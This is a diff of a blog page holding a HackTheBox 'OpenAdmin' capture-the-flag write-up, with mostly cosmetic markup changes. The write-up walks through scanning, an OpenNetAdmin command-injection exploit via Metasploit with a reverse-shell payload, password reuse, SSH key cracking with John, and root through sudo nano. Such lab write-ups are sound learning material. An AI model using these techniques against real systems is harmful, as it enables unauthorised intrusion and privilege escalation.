@@ -2,7 +2,7 @@
 <html>
 <head>
 	<meta charset="utf-8" />
-	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBox Openadmin Write Up - AJDIN</title><link rel="icon" type="image/png" href=favicon.ico /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBox Openadmin Write Up - AJDIN</title><link rel="icon" type="image/png" href=/favicon.ico /><meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta property="og:title" content="HackTheBox Openadmin Write Up" />
 <meta property="og:description" content="This is a write up on how to gain root on HackTheBox Openadmin" />
 <meta property="og:type" content="article" />
@@ -59,9 +59,11 @@
 			<h1 class="title">HackTheBox Openadmin Write Up</h1>
 			<div class="meta">Posted at &mdash; May 2, 2020</div>
 		</div>
+		              
 
 		<div class="markdown">
-			<h2 id="reconnaissance">Reconnaissance</h2>
+              		
+<h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
 <p>Let&rsquo;s see what have we got here with nmap.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -O -oA nmap/initial 10.10.10.171
 </code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-sC: run default script scan
@@ -81,11 +83,11 @@
 -x: search for extensions
 -t: number of threads to run
 </code></pre></div><p><img src="/htb/openadmin/gobuster.png" alt="gobuster"></p>
-<h2 id="owning-user">Owning user</h2>
+<h2 id="owning-user">Owning user<a class="anchor" href="#owning-user">#</a></h2>
 <p>Gobuster found /music, if we take a look we can find a reference to 10.10.10.171/ona. This could also be achieved with dirbuster as it can parse html and search for other links. Gobuster doesn&rsquo;t offer this functionality but it&rsquo;s much faster. Let&rsquo;s enum /ona.</p>
 <p><img src="/htb/openadmin/ona.png" alt="ona"></p>
 <p>Looks like some sort of a admin panel. Lets inspect further, we see it&rsquo;s running OpenNetAdmin version 18.1.1, and we can see it&rsquo;s not the latest version. We can run searchsploit for exploits for OpenNetAdmin.</p>
-<h3 id="exploiting-opennetadmin-with-command-injection-exploit">Exploiting OpenNetAdmin with command injection exploit</h3>
+<h3 id="exploiting-opennetadmin-with-command-injection-exploit">Exploiting OpenNetAdmin with command injection exploit<a class="anchor" href="#exploiting-opennetadmin-with-command-injection-exploit">#</a></h3>
 <p><img src="/htb/openadmin/searchsploit.png" alt="searchsploit"></p>
 <p>So we have a exploit for the exact version which this server is running. We can copy <code>47772.rb</code> into Metasploit. If you&rsquo;re importing exploits into Metasploit you should run <code>reload_all</code> in msfconsole after <code>cp</code> the package.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit -m exploits/php/webapps/47772.rb
@@ -96,7 +98,7 @@ set rhost 10.10.10.171
 set payload linux/x64/shell_reverse_tcp
 </code></pre></div><p>After using this payload we get a shell as www-data. You can see who you are with <code>whoami</code>.</p>
 <p><img src="/htb/openadmin/www_data_shell.png" alt="www data shell"></p>
-<h3 id="privilege-escalation-with-db-password">Privilege escalation with db password</h3>
+<h3 id="privilege-escalation-with-db-password">Privilege escalation with db password<a class="anchor" href="#privilege-escalation-with-db-password">#</a></h3>
 <p>Now we need to escalate privileges. Let&rsquo;s see who is using this machine.</p>
 <p><img src="/htb/openadmin/users.png" alt="users"></p>
 <p>We have Jimmy and Joanna. Let&rsquo;s enumerate the directory we are thrown in. You have to chech every folder from here. The key to escalating privileges is finding the <code>./local/config</code> folder. We have a file with clear text password for the database.</p>
@@ -104,7 +106,7 @@ set payload linux/x64/shell_reverse_tcp
 <p>Now we can assume one of the users was sloppy and used the same password for their account. Let&rsquo;s to to ssh into one of them.</p>
 <p><img src="/htb/openadmin/jimmy_ssh.png" alt="ssh"></p>
 <p>So we can ssh into Jimmy but it doesn&rsquo;t contain the user.txt, so joanna is the user which we have to own. Now this is a bit tricky. We have to enumerate again. Directory <code>/var/www</code> seems like a server of some sort.</p>
-<h3 id="wierd-server-on-localhost">Wierd server on localhost</h3>
+<h3 id="wierd-server-on-localhost">Wierd server on localhost<a class="anchor" href="#wierd-server-on-localhost">#</a></h3>
 <p><img src="/htb/openadmin/main_php.png" alt="main php"></p>
 <p>So if we can access the server it will output us the ssh private key for joanna. Amazing, but how do we access that? Let&rsquo;s run netstat</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netstat -lt 
@@ -116,7 +118,7 @@ set payload linux/x64/shell_reverse_tcp
 </code></pre></div><p><img src="/htb/openadmin/curl_1.png" alt="curl"></p>
 <p>We&rsquo;ve got a webpage, let&rsquo;s access that main.php file from before.</p>
 <p><img src="/htb/openadmin/curl_2.png" alt="curl"></p>
-<h3 id="cracking-the-hash-with-john">Cracking the hash with John</h3>
+<h3 id="cracking-the-hash-with-john">Cracking the hash with John<a class="anchor" href="#cracking-the-hash-with-john">#</a></h3>
 <p>Now we have the <code>id_rsa</code> key for joanna we have to decrypt it, so we can get the password for the private key. Copy the key on your machine and save it as <code>id_rsa</code>, and copy the <code>ssh2john</code> script so we can use john on this key.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/openadmin$ cp /usr/share/john/ssh2john.py .
 </code></pre></div><p>Pipe the output to a file:</p>
@@ -127,12 +129,12 @@ set payload linux/x64/shell_reverse_tcp
 <p>from here we can cat <code>user.txt</code> and we have got the user flag.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ cat user.txt
 c9b2c...
-</code></pre></div><h2 id="getting-root">Getting root</h2>
+</code></pre></div><h2 id="getting-root">Getting root<a class="anchor" href="#getting-root">#</a></h2>
 <p>Getting root is fairly easy. Each time you log into an user, try running <code>sudo -l</code> so you can see if something can be ran as root, and exploited to gain a shell. Luckily we do have a command we can run as root.</p>
 <p><img src="/htb/openadmin/sudo_l.png" alt="sudo l"></p>
 <p>If you encounter any command that can be ran as root you should check out GTFOBins. They can help you break out of an environment. Now run the above mentioned command as root, and get a shell as root.
 (note: you can also use the file read GTFOBin)</p>
-<h3 id="privilege-escalation-with-nano">Privilege escalation with Nano</h3>
+<h3 id="privilege-escalation-with-nano">Privilege escalation with Nano<a class="anchor" href="#privilege-escalation-with-nano">#</a></h3>
 <p><img src="/htb/openadmin/nano.png" alt="nano"></p>
 <p>You might get confused as the first few commands will overwrite nano&rsquo;s interface but just navigate to root.txt</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ whoami 
@@ -140,6 +142,7 @@ root
 $ cat /root/root.txt
 2f907...
 </code></pre></div><p>This is how I managed to gain root on this box. Hope you learned something through this write up.</p>
+
 
 		</div>
 
@@ -163,7 +166,7 @@ $ cat /root/root.txt
 		</div>
 	<div class="footer wrapper">
 	<nav class="nav">
-		<div> © All rights reserved |  <a href="https://github.com/vividvilla/ezhil">Ezhil theme</a> | Built with <a href="https://gohugo.io">Hugo</a></div>
+		<div> © All rights reserved |  <a href="https://twitter.com/ajdintrejic">Ajdin Trejić</a></div>
 	</nav>
 </div>
 
